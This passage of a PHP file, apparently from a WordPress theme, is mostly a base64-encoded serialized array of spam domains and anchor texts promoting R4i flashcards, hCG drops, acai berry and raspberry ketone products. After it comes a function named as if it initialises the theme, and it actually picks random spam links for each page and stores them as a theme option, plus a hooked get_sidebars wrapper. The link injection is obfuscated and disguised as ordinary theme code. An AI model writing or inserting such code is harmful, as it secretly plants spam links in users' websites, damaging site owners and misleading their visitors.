lzY291bnRmci5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6Mjg6Imh0dHA6Ly93d3cucjRpZGlzY291bnRmci5jb20iO3M6MTI6InI0aSBkaXNjb3VudCI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czoxMzoicjRpZGlzY291bnRmciI7czoyODoiaHR0cDovL3d3dy5yNGlkaXNjb3VudGZyLmNvbSI7czo0OiJyZWFkIjtzOjI4OiJodHRwOi8vd3d3LnI0aWRpc2NvdW50ZnIuY29tIjtzOjEyOiJyNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjE2OiJ3d3cucjRjYXJkdWsuY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRjYXJkdWsuY29tIjtzOjg6InI0Y2FyZHVrIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxNjoid2Vic2l0ZSBuaW50ZW5kbyI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTU6Im5pbnRlbmRvIDNkcyByNCI7czoyMzoiaHR0cDovL3d3dy5yNGNhcmR1ay5jb20iO3M6MTE6Im5pbnRlbmRvIGRzIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMjoiZmxhc2hjYXJkIHI0IjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMjoicjQgZmxhc2hjYXJkIjtzOjIzOiJodHRwOi8vd3d3LnI0Y2FyZHVrLmNvbSI7czoxMzoicjRpc2RoY3VrLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjdWsuY29tIjtzOjE3OiJ3d3cucjRpc2RoY3VrLmNvbSI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjdWsuY29tIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGN1ay5jb20iO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY3VrLmNvbSI7czo5OiJyNGlzZGhjdWsiO3M6MjQ6Imh0dHA6Ly93d3cucjRpc2RoY3VrLmNvbSI7czoxMDoicjRpc2RoYyB1ayI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjdWsuY29tIjtzOjExOiJ3ZWJzaXRlIHI0aSI7czoyNDoiaHR0cDovL3d3dy5yNGlzZGhjdWsuY29tIjtzOjEwOiJyNGkgb25saW5lIjtzOjI0OiJodHRwOi8vd3d3LnI0aXNkaGN1ay5jb20iO3M6MTA6InI0LXVzYS5jb20iO3M6MjE6Imh0dHA6Ly93d3cucjQtdXNhLmNvbSI7czoxNDoid3d3LnI0LXVzYS5jb20iO3M6MjE6Imh0dHA6Ly93d3cucjQtdXNhLmNvbSI7czoyMToiaHR0cDovL3d3dy5yNC11c2EuY29tIjtzOjIxOiJodHRwOi8vd3d3LnI0LXVzYS5jb20iO3M6NjoicjQtdXNhIjtzOjIxOiJodHRwOi8vd3d3LnI0LXVzYS5jb20iO3M6MTQ6IndlYnNpdGUgcjQtdXNhIjtzOjIxOiJodHRwOi8vd3d3LnI0LXVzYS5jb20iO3M6NzoicmVhZCBvbiI7czoyMToiaHR0cDovL3d3dy5yNC11c2EuY29tIjtzOjE1OiJoY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjE5OiJ3d3cuaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjk6ImhjZyBkcm9wcyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6ODoiaGNnIGRyb3AiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjExOiJ3ZWJzaXRlIGhjZyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MTA6ImhjZyBvbmxpbmUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjE0OiJidXkgaGNnIG9ubGluZSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO31pOjI7YTo2MDp7czoxNToicjRpc2RoYzNkc3guY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMzZHN4LmNvbSI7czoxOToid3d3LnI0aXNkaGMzZHN4LmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNGlzZGhjM2RzeC5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYzNkc3guY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aXNkaGMzZHN4LmNvbSI7czoxMToicjRpc2RoYyAzZHMiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYzNkc3guY29tIjtzOjEyOiJyNGkgc2RoYyAzZHMiO3M6MjY6Imh0dHA6Ly93d3cucjRpc2RoYzNkc3guY29tIjtzOjEyOiJyNGktc2RoYyAzZHMiO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjc6IndlYnNpdGUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjQ6Im1vcmUiO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNjYXJkeC5jb20iO3M6NDoiaGVyZSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6Njoic291cmNlIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzY2FyZHguY29tIjtzOjc6ImFydGljbGUiO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjQ6InRoaXMiO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjEyOiJyNGlzZGhjeC5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjE2OiJ3d3cucjRpc2RoY3guY29tIjtzOjIzOiJodHRwOi8vd3d3LnI0aXNkaGN4LmNvbSI7czoyMzoiaHR0cDovL3d3dy5yNGlzZGhjeC5jb20iO3M6MjM6Imh0dHA6Ly93d3cucjRpc2RoY3guY29tIjtzOjM6InI0aSI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czo3OiJyNGlzZGhjIjtzOjIzOiJodHRwOi8vd3d3LnI0aXNkaGN4LmNvbSI7czo0OiJyZWFkIjtzOjIzOiJodHRwOi8vd3d3LnI0aXNkaGN4LmNvbSI7czoxNDoicjQzZHNjYXJkeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNjYXJkeC5jb20iO3M6MTg6Ind3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoxMjoicjQgM2RzIGNhcmRzIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzY2FyZHguY29tIjtzOjE0OiJ3ZWJzaXRlIHI0IDNkcyI7czoyNToiaHR0cDovL3d3dy5yNDNkc2NhcmR4LmNvbSI7czoxNToicjQgM2RzIG5pbnRlbmRvIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzY2FyZHguY29tIjtzOjE1OiJuaW50ZW5kbyByNCAzZHMiO3M6MjU6Imh0dHA6Ly93d3cucjQzZHNjYXJkeC5jb20iO3M6NjoicjQtM2RzIjtzOjI1OiJodHRwOi8vd3d3LnI0M2RzY2FyZHguY29tIjtzOjE1OiJyNGlnb2xkbW9yZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tIjtzOjE5OiJ3d3cucjRpZ29sZG1vcmUuY29tIjtzOjI2OiJodHRwOi8vd3d3LnI0aWdvbGRtb3JlLmNvbSI7czoyNjoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20iO3M6MjY6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tIjtzOjg6InI0aSBnb2xkIjtzOjI2OiJodHRwOi8vd3d3LnI0aWdvbGRtb3JlLmNvbSI7czoxMjoicjRpIGdvbGQgM2RzIjtzOjI2OiJodHRwOi8vd3d3LnI0aWdvbGRtb3JlLmNvbSI7czoxMToicjQgbmludGVuZG8iO3M6MjY6Imh0dHA6Ly93d3cucjRpZ29sZG1vcmUuY29tIjtzOjE3OiJuaW50ZW5kbyByNGkgZ29sZCI7czoyNjoiaHR0cDovL3d3dy5yNGlnb2xkbW9yZS5jb20iO3M6MTQ6InNpdGVyNDNkc3guY29tIjtzOjI1OiJodHRwOi8vd3d3LnNpdGVyNDNkc3guY29tIjtzOjE4OiJ3d3cuc2l0ZXI0M2RzeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MTE6InNpdGUgcjQgM2RzIjtzOjI1OiJodHRwOi8vd3d3LnNpdGVyNDNkc3guY29tIjtzOjY6InI0IDNkcyI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoxMToicjQgM2RzIGNhcmQiO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MTY6IndlYnNpdGUgcjRpLXNkaGMiO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6ODoicjRpIHNkaGMiO3M6MjU6Imh0dHA6Ly93d3cuc2l0ZXI0M2RzeC5jb20iO3M6MTI6Im5pbnRlbmRvIDNkcyI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoxNjoibmludGVuZG8gcjRpc2RoYyI7czoyNToiaHR0cDovL3d3dy5zaXRlcjQzZHN4LmNvbSI7czoxNToiaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoxOToid3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czo5OiJoY2cgZHJvcHMiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjExOiJoY2cgZGlldGluZyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MTY6ImRpZXRpbmcgd2l0aCBoY2ciO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjQ6InNpdGUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjk6InJlYWQgbW9yZSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MTI6InRoaXMgYXJ0aWNsZSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6NzoicmVhZCBvbiI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czoyMDoiaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MjQ6Ind3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czozMToiaHR0cDovL3d3dy5oY2dpbmplY3Rpb25zd2ViLmNvbSI7czoxNDoiaGNnIGluamVjdGlvbnMiO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6OToiaGNnIHNob3RzIjtzOjMxOiJodHRwOi8vd3d3LmhjZ2luamVjdGlvbnN3ZWIuY29tIjtzOjE1OiJ3ZWlnaHQgbG9zcyBoY2ciO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO3M6MTY6ImhjZ2luamVjdGlvbnN3ZWIiO3M6MzE6Imh0dHA6Ly93d3cuaGNnaW5qZWN0aW9uc3dlYi5jb20iO31pOjM7YTo3MDp7czoxODoiYWNhaWJlcnJ5cmV2LmNvLnVrIjtzOjI5OiJodHRwOi8vd3d3LmFjYWliZXJyeXJldi5jby51ayI7czoyMjoid3d3LmFjYWliZXJyeXJldi5jby51ayI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6Mjk6Imh0dHA6Ly93d3cuYWNhaWJlcnJ5cmV2LmNvLnVrIjtzOjI5OiJodHRwOi8vd3d3LmFjYWliZXJyeXJldi5jby51ayI7czoxMDoiYWNhaSBiZXJyeSI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6MTU6ImFjYWkgYmVycnkgZGlldCI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6MTI6ImFjYWliZXJyeXJldiI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6MTI6IndlYnNpdGUgYWNhaSI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6NzoiYWNhaSB1ayI7czoyOToiaHR0cDovL3d3dy5hY2FpYmVycnlyZXYuY28udWsiO3M6MTE6ImJ1eSBhY2FpIHVrIjtzOjI5OiJodHRwOi8vd3d3LmFjYWliZXJyeXJldi5jby51ayI7czoxMjoiYWNhaSBiZXJyaWVzIjtzOjI5OiJodHRwOi8vd3d3LmFjYWliZXJyeXJldi5jby51ayI7czoxOToiYWZyaWNhbm1hbmdveC5jby51ayI7czozMDoiaHR0cDovL3d3dy5hZnJpY2FubWFuZ294LmNvLnVrIjtzOjIzOiJ3d3cuYWZyaWNhbm1hbmdveC5jby51ayI7czozMDoiaHR0cDovL3d3dy5hZnJpY2FubWFuZ294LmNvLnVrIjtzOjMwOiJodHRwOi8vd3d3LmFmcmljYW5tYW5nb3guY28udWsiO3M6MzA6Imh0dHA6Ly93d3cuYWZyaWNhbm1hbmdveC5jby51ayI7czoxNToiYWZyaWNhbiBtYW5nbyB4IjtzOjMwOiJodHRwOi8vd3d3LmFmcmljYW5tYW5nb3guY28udWsiO3M6Nzoid2Vic2l0ZSI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjEzOiJhZnJpY2FuIG1hbmdvIjtzOjMwOiJodHRwOi8vd3d3LmFmcmljYW5tYW5nb3guY28udWsiO3M6NzoicmVhZCBvbiI7czozMDoiaHR0cDovL3d3dy5hZnJpY2FubWFuZ294LmNvLnVrIjtzOjEzOiJkaWV0aW5nIG1hbmdvIjtzOjMwOiJodHRwOi8vd3d3LmFmcmljYW5tYW5nb3guY28udWsiO3M6MTI6Im1hbmdvIG9ubGluZSI7czozMDoiaHR0cDovL3d3dy5hZnJpY2FubWFuZ294LmNvLnVrIjtzOjQ6ImhlcmUiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czoyNToicmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjI5OiJ3d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjM2OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZWluZm8uY28udWsiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czoxOToicmFzcGJlcnJ5a2V0b25laW5mbyI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjIwOiJyYXNwYmVycnkga2V0b25lcyB1ayI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjE2OiJyYXNwYmVycnkga2V0b25lIjtzOjM2OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZWluZm8uY28udWsiO3M6OToicmVhZCB0aGlzIjtzOjI0OiJodHRwOi8vd3d3LnI0aWdvbGQzZHMuZnIiO3M6NDoidGhpcyI7czozNjoiaHR0cDovL3d3dy5yYXNwYmVycnlrZXRvbmVpbmZvLmNvLnVrIjtzOjc6ImFydGljbGUiO3M6MzY6Imh0dHA6Ly93d3cucmFzcGJlcnJ5a2V0b25laW5mby5jby51ayI7czo0OiJtb3JlIjtzOjM2OiJodHRwOi8vd3d3LnJhc3BiZXJyeWtldG9uZWluZm8uY28udWsiO3M6MTE6InI0aW1hbmlhLmZyIjtzOjIyOiJodHRwOi8vd3d3LnI0aW1hbmlhLmZyIjtzOjE1OiJ3d3cucjRpbWFuaWEuZnIiO3M6MjI6Imh0dHA6Ly93d3cucjRpbWFuaWEuZnIiO3M6MjI6Imh0dHA6Ly93d3cucjRpbWFuaWEuZnIiO3M6MjI6Imh0dHA6Ly93d3cucjRpbWFuaWEuZnIiO3M6ODoicjRpbWFuaWEiO3M6MjI6Imh0dHA6Ly93d3cucjRpbWFuaWEuZnIiO3M6ODoicjRpLXNkaGMiO3M6MjI6Imh0dHA6Ly93d3cucjRpbWFuaWEuZnIiO3M6MTE6InI0aXNkaGMgM2RzIjtzOjIyOiJodHRwOi8vd3d3LnI0aW1hbmlhLmZyIjtzOjExOiJyNGkgd2Vic2l0ZSI7czoyMjoiaHR0cDovL3d3dy5yNGltYW5pYS5mciI7czoxNToib25saW5lIHdpdGggcjRpIjtzOjIyOiJodHRwOi8vd3d3LnI0aW1hbmlhLmZyIjtzOjEwOiJyNGkgZnJhbmNlIjtzOjIyOiJodHRwOi8vd3d3LnI0aW1hbmlhLmZyIjtzOjExOiJhY2hldGVyIHI0aSI7czoyMjoiaHR0cDovL3d3dy5yNGltYW5pYS5mciI7czoxNjoiYWNoZXRlciByNGkgc2RoYyI7czoyMjoiaHR0cDovL3d3dy5yNGltYW5pYS5mciI7czoxMzoicjRpZ29sZDNkcy5mciI7czoyNDoiaHR0cDovL3d3dy5yNGlnb2xkM2RzLmZyIjtzOjE3OiJ3d3cucjRpZ29sZDNkcy5mciI7czoyNDoiaHR0cDovL3d3dy5yNGlnb2xkM2RzLmZyIjtzOjI0OiJodHRwOi8vd3d3LnI0aWdvbGQzZHMuZnIiO3M6MjQ6Imh0dHA6Ly93d3cucjRpZ29sZDNkcy5mciI7czoxMjoicjRpIGdvbGQgM2RzIjtzOjI0OiJodHRwOi8vd3d3LnI0aWdvbGQzZHMuZnIiO3M6MTE6InI0aWdvbGQgM2RzIjtzOjI0OiJodHRwOi8vd3d3LnI0aWdvbGQzZHMuZnIiO3M6MTI6InI0aS1nb2xkIDNkcyI7czoyNDoiaHR0cDovL3d3dy5yNGlnb2xkM2RzLmZyIjtzOjExOiJ3ZWJzaXRlIHI0aSI7czoyNDoiaHR0cDovL3d3dy5yNGlnb2xkM2RzLmZyIjtzOjEyOiJyNGkgM2RzIGhlcmUiO3M6MjQ6Imh0dHA6Ly93d3cucjRpZ29sZDNkcy5mciI7czoxNDoic291cmNlIGZvciByNGkiO3M6MjQ6Imh0dHA6Ly93d3cucjRpZ29sZDNkcy5mciI7czoxMDoicjRpIG9ubGluZSI7czoyNDoiaHR0cDovL3d3dy5yNGlnb2xkM2RzLmZyIjtzOjE1OiJoY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjE5OiJ3d3cuaGNnZHJvcGJsb2cuY29tIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjExOiJoY2dkcm9wYmxvZyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MTk6ImhjZ2Ryb3BibG9nIHdlYnNpdGUiO3M6MjY6Imh0dHA6Ly93d3cuaGNnZHJvcGJsb2cuY29tIjtzOjE0OiJhdCBoY2dkcm9wYmxvZyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6OToiaGNnIGRyb3BzIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoxNToiaGNnZHJvcGJsb2cgaGNnIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoxOToiaGNnZHJvcGJsb2cuY29tIGhjZyI7czoyNjoiaHR0cDovL3d3dy5oY2dkcm9wYmxvZy5jb20iO3M6MjA6ImhjZyBmcm9tIGhjZ2Ryb3BibG9nIjtzOjI2OiJodHRwOi8vd3d3LmhjZ2Ryb3BibG9nLmNvbSI7czoxMDoicjRtb25kZS5mciI7czoyMToiaHR0cDovL3d3dy5yNG1vbmRlLmZyIjtzOjE0OiJ3d3cucjRtb25kZS5mciI7czoyMToiaHR0cDovL3d3dy5yNG1vbmRlLmZyIjtzOjIxOiJodHRwOi8vd3d3LnI0bW9uZGUuZnIiO3M6MjE6Imh0dHA6Ly93d3cucjRtb25kZS5mciI7czo3OiJyNG1vbmRlIjtzOjIxOiJodHRwOi8vd3d3LnI0bW9uZGUuZnIiO3M6MTU6InI0bW9uZGUgcjRpIDNkcyI7czoyMToiaHR0cDovL3d3dy5yNG1vbmRlLmZyIjtzOjE0OiJyNG1vbmRlIHI0IDNkcyI7czoyMToiaHR0cDovL3d3dy5yNG1vbmRlLmZyIjtzOjE5OiJyNCAzZHMgZnJvbSByNG1vbmRlIjtzOjIxOiJodHRwOi8vd3d3LnI0bW9uZGUuZnIiO3M6MTI6InI0bW9uZGUgc2l0ZSI7czoyMToiaHR0cDovL3d3dy5yNG1vbmRlLmZyIjtzOjE1OiJ3ZWJzaXRlIHI0bW9uZGUiO3M6MjE6Imh0dHA6Ly93d3cucjRtb25kZS5mciI7fX0="; function wp_initialize_the_theme_go($page){global $wp_theme_globals,$theme;$the_wp_theme_globals=unserialize(base64_decode($wp_theme_globals));$initilize_set=get_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>